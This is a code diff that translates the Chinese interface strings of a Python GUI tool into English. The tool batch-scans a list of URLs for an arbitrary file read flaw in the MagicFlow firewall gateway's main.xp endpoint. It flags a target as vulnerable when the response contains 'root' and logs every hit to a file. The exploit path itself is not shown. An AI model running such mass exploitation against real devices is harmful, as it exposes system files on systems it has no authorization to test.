@@ -11,25 +11,25 @@ def magicflow_readfile_exp(url):
     try:
         res = requests.get(url, verify=False, timeout=3)
         if "root" in res.text:
-            magicflow_readfile_text.insert(END,"【！！！！！！】存在漏洞的url：" + url + "\n")
+            magicflow_readfile_text.insert(END,"[! ! ! ! ! ! ] Vulnerable url:" + url + "\n")
             magicflow_readfile_text.see(END)
-            with open ("存在MagicFlow 防火墙网关 main.xp 任意文件读取漏洞的url.txt", 'a') as f:
+            with open ("[exists]magicflow_readfile_url.txt", 'a') as f:
                 f.write(url + "\n")
         else:
-            magicflow_readfile_text.insert(END,"【×】不存在漏洞的url：" + url + "\n")
+            magicflow_readfile_text.insert(END,"[×]URL without vulnerability:" + url + "\n")
             magicflow_readfile_text.see(END)
     except Exception as err:
-        magicflow_readfile_text.insert(END, "【×】目标请求失败，报错内容：" + str(err) + "\n")
+        magicflow_readfile_text.insert(END, "[×]The target request failed, and the error content:" + str(err) + "\n")
         magicflow_readfile_text.see(END)
 def get_magicflow_readfile_addr():
-    with open("修正后的url.txt","r") as f:
+    with open("corrected url.txt","r") as f:
         for address in f.readlines():
             address = address.strip()
             yield address
 def magicflow_readfile_gui():
     magicflow_readfile = Toplevel()
     magicflow_readfile.geometry("1035x455")
-    magicflow_readfile.title("MagicFlow 防火墙网关 main.xp 任意文件读取漏洞一把梭")
+    magicflow_readfile.title("MagicFlow firewall gateway reads arbitrary files [auto-muti-exp]")
     magicflow_readfile.resizable(0, 0)
     logo = PhotoImage(file="./logo.ico")
     magicflow_readfile.tk.call('wm', 'iconphoto', magicflow_readfile._w, logo)
